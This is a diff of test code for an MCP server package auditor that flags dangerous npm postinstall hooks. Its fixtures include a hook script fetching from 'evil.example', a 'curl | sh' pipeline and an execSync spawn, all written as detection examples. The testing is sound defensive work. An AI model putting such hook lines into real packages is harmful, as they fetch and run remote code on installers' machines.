@@ -1,6 +1,6 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
-import { auditPackage, summarize, renderMarkdown, newestPerServer } from '../mcp-audit.mjs'
+import { auditPackage, summarize, renderMarkdown, newestPerServer, hookScriptRefs } from '../mcp-audit.mjs'
 
 const server = {
   name: 'acme/server',
@@ -24,11 +24,11 @@ test('auditPackage flags install-time execution and a shell pipeline', () => {
   const rules = findings.map((f) => f.rule)
   assert.ok(rules.includes('stdio-transport'))
   assert.ok(rules.includes('install-time-execution'))
-  assert.ok(rules.includes('install-script-shell-pipeline'))
+  assert.ok(rules.includes('install-hook-critical'))
   assert.ok(rules.includes('repository-mismatch'))
   assert.ok(rules.includes('declared-version-not-latest'))
   assert.ok(rules.includes('process-spawn-dependency'))
-  const critical = findings.find((f) => f.rule === 'install-script-shell-pipeline')
+  const critical = findings.find((f) => f.rule === 'install-hook-critical')
   assert.equal(critical.severity, 'critical')
   assert.match(critical.evidence, /postinstall/)
 })
@@ -98,4 +98,35 @@ test('auditPackage records one stdio finding even with several packages', () => 
   ] }
   const findings = auditPackage(server, null, {})
   assert.equal(findings.filter((f) => f.rule === 'stdio-transport').length, 1)
+})
+
+const pkg = (hook) => ({ 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { scripts: { postinstall: hook } } } })
+
+test('a print-only node -e hook is not critical (v0 false positive)', () => {
+  const findings = auditPackage(server, pkg("node -e \"console.log('installed')\""), { version: '1.0.0' })
+  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
+  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
+})
+
+test('a hook that spawns a process is critical', () => {
+  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync('npm run build')\""), { version: '1.0.0' })
+  const critical = findings.find((f) => f.rule === 'install-hook-critical')
+  assert.equal(critical.severity, 'critical')
+  assert.match(critical.evidence, /process-spawn/)
+})
+
+test('a referenced hook script is inspected from its content', () => {
+  const doc = pkg('node scripts/postinstall.cjs')
+  const benign = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "console.log('hello')" })
+  assert.ok(benign.some((f) => f.rule === 'install-hook-script-inspected'))
+  assert.ok(!benign.some((f) => f.severity === 'critical'))
+  const fetched = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('https').get('https://evil.example/x')" })
+  assert.ok(fetched.some((f) => f.rule === 'install-hook-script-critical' && f.severity === 'critical'))
+  const missing = auditPackage(server, doc, { version: '1.0.0' }, {})
+  assert.ok(missing.some((f) => f.rule === 'install-hook-script-unavailable' && f.severity === 'unknown'))
+})
+
+test('hookScriptRefs extracts local script paths', () => {
+  assert.deepEqual(hookScriptRefs({ postinstall: 'node scripts/install.js' }), ['scripts/install.js'])
+  assert.deepEqual(hookScriptRefs({ postinstall: 'curl https://x | sh' }), [])
 })
